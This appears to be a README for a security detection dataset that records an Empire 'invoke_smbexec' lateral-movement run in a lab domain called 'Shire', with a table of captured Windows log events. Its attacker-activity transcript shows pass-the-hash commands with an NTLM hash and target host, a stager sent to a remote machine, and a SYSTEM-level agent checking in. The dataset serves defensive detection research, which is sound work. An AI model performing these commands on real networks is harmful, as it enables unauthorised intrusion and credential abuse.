# Empire Invoke Smbexec

Executes a stager on remote hosts using SMBExec.ps1

## Technique(s) ID

T1077

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_smbexec.tar.gz](./empire_invoke_smbexec.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18210125

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             738 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               6 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Service Control Manager             | na                                                     |               2 |
| System                                     | LsaSrv                              | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             214 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             104 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              40 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              12 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Credential Validation                                  |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security System Extension                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             461 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             458 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             310 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             190 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              36 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              27 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              15 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             649 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule lateral_movement/invoke_smbexec
(Empire: powershell/lateral_movement/invoke_smbexec) > info

              Name: Invoke-SMBExec
            Module: powershell/lateral_movement/invoke_smbexec
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @rvrsh3ll

Description:
  Executes a stager on remote hosts using SMBExec.ps1

Comments:
  https://raw.githubusercontent.com/Kevin-Robertson/Invoke-
  TheHash/master/Invoke-SMBExec.ps1

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  Service      False                                 Name of service to create and delete.   
                                                     Defaults to 20 char random.             
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  Username     True                                  Username.                               
  Domain       False                                 Domain.                                 
  Hash         True                                  NTLM Hash in LM:NTLM or NTLM format.    
  Agent        True        TKV35P8X                  Agent to run module on.                 
  Listener     True                                  Listener to use.                        
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      

(Empire: powershell/lateral_movement/invoke_smbexec) > set Username pgustavo
(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain shire
(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash 8ece039f32592670b45fc801e2a9157d
(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_smbexec) > execute
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 27
[*] Tasked agent TKV35P8X to run module powershell/lateral_movement/invoke_smbexec
(Empire: powershell/lateral_movement/invoke_smbexec) > Command executed with service PWXYXULFULYYGFYDYBIF on IT001.shire.com


[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent XSZ91N7T checked in
[+] Initial agent XSZ91N7T from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to XSZ91N7T at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_smbexec) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:02:06  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:02:09  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:02:08  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:02:10  https           
 XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:02:08  https           

(Empire: agents) >
```